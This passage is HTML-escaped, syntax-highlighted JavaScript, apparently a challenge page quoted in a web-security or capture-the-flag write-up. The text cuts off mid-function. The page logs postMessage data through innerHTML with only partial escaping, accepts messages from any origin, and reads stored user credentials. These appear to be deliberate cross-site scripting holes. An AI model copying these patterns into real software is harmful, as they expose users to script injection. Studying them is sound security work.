language-javascript&quot;&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;anchor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;NFC&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;parse&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;typeof&lt;/span&gt; e &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;string&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// make object look like string&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; log &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;prefix&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;info&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; safe&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; line &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;li&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; prefix_tag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;span&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; text_tag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;span&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;info&#39;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;style&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;backgroundColor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;lightcyan&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;success&#39;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;style&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;backgroundColor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;lightgreen&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;warn&#39;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;style&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;backgroundColor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;lightyellow&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;err&#39;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;style&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;backgroundColor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;lightpink&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;style&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;backgroundColor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;lightcyan&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;            &lt;br&gt;            data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;safe&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-flags&quot;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;&amp;amp;lt;&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;            prefix_tag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; prefix&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            text_tag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;            line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;prefix_tag&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            line&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;text_tag&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;#console&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;line&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;Connection status: &#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;navigator&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;onLine&lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Online&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Offline&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function-variable function&quot;&gt;onmessage&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[log]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;anchor&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[anchor]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;info&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;clear&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;querySelector&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;#console&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;innerHTML &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[???]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Wrong command received: &quot;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;c4936ad76292ee7100ecb9d72054e71f&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;DEV&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;Production build!&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;checkCredentials&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; password&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; users &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;store&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; access &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;admin&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;moderator&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;manager&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;users &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span 